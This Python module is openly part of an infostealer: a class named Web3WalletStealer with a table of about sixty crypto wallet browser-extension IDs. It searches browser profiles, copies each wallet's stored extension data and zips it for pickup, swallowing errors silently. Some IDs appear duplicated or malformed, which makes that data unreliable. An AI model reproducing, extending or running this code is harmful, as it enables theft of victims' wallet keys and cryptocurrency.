import os
import shutil
import zipfile
from . import utils

WEB3_WALLETS = {
    'metamask': {'id': 'nkbihfbeogaeaoehlefnkodbefgpgknn', 'name': 'MetaMask'},
    'phantom': {'id': 'bfnaelmomeimhlpmgjnjophhpkkoljpa', 'name': 'Phantom'},
    'rabby': {'id': 'acmacodkjbdgmoleebolmdjonilkdbch', 'name': 'Rabby'},
    'coinbase': {'id': 'hnfanknocfeofbddgcijnmhnfnkdnaad', 'name': 'Coinbase Wallet'},
    'binance': {'id': 'fhbohimaelbohpjbbldcngcnapndodjp', 'name': 'Binance Wallet'},
    'keplr': {'id': 'dmkamcknogkgcdfhhbddcghachkejeap', 'name': 'Keplr'},
    'nami': {'id': 'lpfcbjknijpeeillifnkikgncikgfhdo', 'name': 'Nami'},
    'ronin': {'id': 'bblcdmnaokkbpjhbfaoplfihdppbgb', 'name': 'Ronin Wallet'},
    'trustwallet': {'id': 'egjidjbpglichdcondbcbdnbeeppkphb', 'name': 'Trust Wallet'},
    'mathwallet': {'id': 'afbcbjpbpfadlkmhmclhkeeodmamcflc', 'name': 'Math Wallet'},
    'terra_station': {'id': 'aiifbnbfobpmeekipheeijimdpnlpgpp', 'name': 'Terra Station'},
    'martian': {'id': 'cpcjdphnpdjjajagadejpbjnfdkfbhpb', 'name': 'Martian Wallet'},
    'petra': {'id': 'ejjladineckdgjemeijbdahhhbhehdoe', 'name': 'Petra'},
    'fewcha': {'id': 'jdkknndbebbapbiloaofgmceiiphokap', 'name': 'Fewcha'},
    'pontem': {'id': 'phkbamefinggmakgklpkljjmgibohnba', 'name': 'Pontem'},
    'solflare': {'id': 'bhhhlbepdkbapadjdnnojkbgioiodbic', 'name': 'Solflare'},
    'exodus': {'id': 'aholpfdialjgjfhomihkjbmgjidlcdno', 'name': 'Exodus'},
    'tally': {'id': 'eipmnfdnkjofgnpjjdgmfnaoibgklnjc', 'name': 'Tally'},
    'frame': {'id': 'ejbalbakoplchlghecdalmeeeajnimhm', 'name': 'Frame'},
    'liquality': {'id': 'kpfopkelmcoipemdgiijsikoboeppfom', 'name': 'Liquality'},
    'xdefi': {'id': 'hmeobnfnfcmdkdcmlblgagmfpfboieaf', 'name': 'XDEFI'},
    'core': {'id': 'agoakfejjabomempkjlepdflaleeobhb', 'name': 'Core'},
    'subwallet': {'id': 'onhogfjeacnfoofkfgppdlbmlmnplgbn', 'name': 'SubWallet'},
    'talisman': {'id': 'fijngjgcjhjmmpcmkeiomlglpeiijkld', 'name': 'Talisman'},
    'polkadotjs': {'id': 'fhmfendgdocmcbmfikdcogofphimnkno', 'name': 'Polkadot.js'},
    'yoroi': {'id': 'ffnbelfdoeiohenkjibnmadjiehjhajb', 'name': 'Yoroi'},
    'eternl': {'id': 'kmhcihpebfmpgmihbkipmjlmmioameka', 'name': 'Eternl'},
    'flint': {'id': 'hnhobjmcibchnmglfbldbfabcgaknlkj', 'name': 'Flint'},
    'gerowallet': {'id': 'bikervjbuzqmfgdlhifppjbfflbnkoki', 'name': 'GeroWallet'},
    'begin': {'id': 'jinjaccalgkegednnccohejagnlnfdag', 'name': 'Begin Wallet'},
    'byone': {'id': 'fhilaheimglignddkjgofkcbgekhenbh', 'name': 'BYONE'},
    'safepal': {'id': 'lgmpcpglpngdoalbgeoldeajfclnhafa', 'name': 'SafePal'},
    'onekey': {'id': 'jnmbobjmhlngoefaiojfljckilhhlhcj', 'name': 'OneKey'},
    'imtoken': {'id': 'nlbmnnijcnlegkjjpcfjclmcfggfefdm', 'name': 'imToken'},
    'tpwallet': {'id': 'mfgccjchihfkkindfppnaooecgfneiii', 'name': 'TP Wallet'},
    'bitkeep': {'id': 'jiidiaalihmmhddjgbnbgdfflelocpak', 'name': 'BitKeep'},
    'okxwallet': {'id': 'mcohilncbfahbmgdjkbpemcciiolgcge', 'name': 'OKX Wallet'},
    'kraken': {'id': 'ifbboakaemklalnlmnpdkeiifbfijjlm', 'name': 'Kraken'},
    'enkrypt': {'id': 'gkjbkjkpjpdpbhkdpjlnjlnjlnjlnjln', 'name': 'Enkrypt'},
    'mycrypto': {'id': 'nlgbhdfgdhgbiamfdfmbikcdghjaddom', 'name': 'MyCrypto'},
    'harmony': {'id': 'fnnegphlobjdpkhecapkijjdkgcjhkib', 'name': 'Harmony'},
    'iconex': {'id': 'flpiciilemghbmfalicajoolhkkenfel', 'name': 'ICONex'},
    'wombat': {'id': 'amkmjjmmflddogmhpjloimipbofnfjih', 'name': 'Wombat'},
    'guildwallet': {'id': 'nanjmdknhkinifnkgdcggcfnhdaammmj', 'name': 'Guild Wallet'},
    'neoline': {'id': 'cphhlgmgameodnhkjdmkpanlelnlohao', 'name': 'Neoline'},
    'cyano': {'id': 'dkdedlpgdmmkkfjabffeganieamfklkm', 'name': 'Cyano'},
    'ontowallet': {'id': 'oplligpicccjckpbcjkfdpogfcbgpmkl', 'name': 'OntoWallet'},
    'concordium': {'id': 'abjcfabbhafbcdfjoecdgepllmpfceif', 'name': 'Concordium'},
    'alephium': {'id': 'oaogpojkjpmjnkebcnldlkmjcpmiodcg', 'name': 'Alephium'},
    'suiwallet': {'id': 'opcgpfmipidbgpenhmajajpdcbmgilic', 'name': 'Sui Wallet'},
    'manta': {'id': 'hpglgdghhkapgdjpbmkbkpnkjkbgbfde', 'name': 'Manta'},
    'nightly': {'id': 'fidojkfdpbkfaijipobknkdlifdcfemp', 'name': 'Nightly'},
    'backpack': {'id': 'aflkmfhebedbjioipglgcbcmnbpgliof', 'name': 'Backpack'},
    'grindery': {'id': 'jdogphakondfdmcanicanmbfaangegaf', 'name': 'Grindery'},
    'starcoin': {'id': 'mfhbebgoclkghebffdldpobeajmbecfk', 'name': 'Starcoin'},
    'kukai': {'id': 'ookjlbkiijinhpmnjffcofjonbfbgaoc', 'name': 'Kukai'},
    'temple': {'id': 'ookjlbkiijinhpmnjffcofjonbfbgaoc', 'name': 'Temple'},
    'spire': {'id': 'hbcennhacfaagdopikcegfcobcadeocj', 'name': 'Spire'},
    'nufinetes': {'id': 'kiopjekfhmcphcqnfahhncbfbggaagdj', 'name': 'Nufinetes'},
    'alby': {'id': 'kmeopaelnckbmkpgdnlkcajoaifmhkpd', 'name': 'Alby'},
    'getalby': {'id': 'kmeopaelnckbmkpgdnlkcajoaifmhkpd', 'name': 'getAlby'}
}

class Web3WalletStealer:
    def __init__(self):
        self.found_wallets = []

    def steal_web3_wallets(self, browser_paths=None):
        if not browser_paths:
            return
        
        for browser_path in browser_paths:
            if not os.path.exists(browser_path):
                continue
            
            profiles = ['Default']
            try:
                for item in os.listdir(browser_path):
                    if item.startswith('Profile') and os.path.isdir(os.path.join(browser_path, item)):
                        profiles.append(item)
            except:
                pass
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile, 'Local Extension Settings')
                if not os.path.exists(profile_path):
                    continue
                
                for wallet_key, wallet_info in WEB3_WALLETS.items():
                    extension_id = wallet_info['id']
                    wallet_name = wallet_info['name']
                    
                    extension_path = os.path.join(profile_path, extension_id)
                    if not os.path.exists(extension_path):
                        continue
                    
                    try:
                        temp_dir = os.path.join(utils.get_temp(), f'shiver_web3_{wallet_key}_{utils.generate_id()}')
                        shutil.copytree(extension_path, temp_dir)
                        
                        zip_path = temp_dir + '.zip'
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            for root, dirs, files in os.walk(temp_dir):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    arcname = os.path.relpath(file_path, temp_dir)
                                    zf.write(file_path, arcname)
                        
                        self.found_wallets.append({
                            'name': wallet_name,
                            'browser': os.path.basename(browser_path),
                            'profile': profile,
                            'zip_path': zip_path
                        })
                        
                        shutil.rmtree(temp_dir, ignore_errors=True)
                    except:
                        pass

    def get_wallets_text(self):
        if not self.found_wallets:
            return ''
        
        text = 'WEB3 WALLETS FOUND\n' + '=' * 60 + '\n\n'
        for wallet in self.found_wallets:
            text += f"Wallet: {wallet['name']}\n"
            text += f"Browser: {wallet['browser']}\n"
            text += f"Profile: {wallet['profile']}\n"
            text += f"Data: {wallet['zip_path']}\n"
            text += '-' * 40 + '\n\n'
        
        return text

    def get_wallet_zips(self):
        return [w['zip_path'] for w in self.found_wallets if os.path.exists(w['zip_path'])]
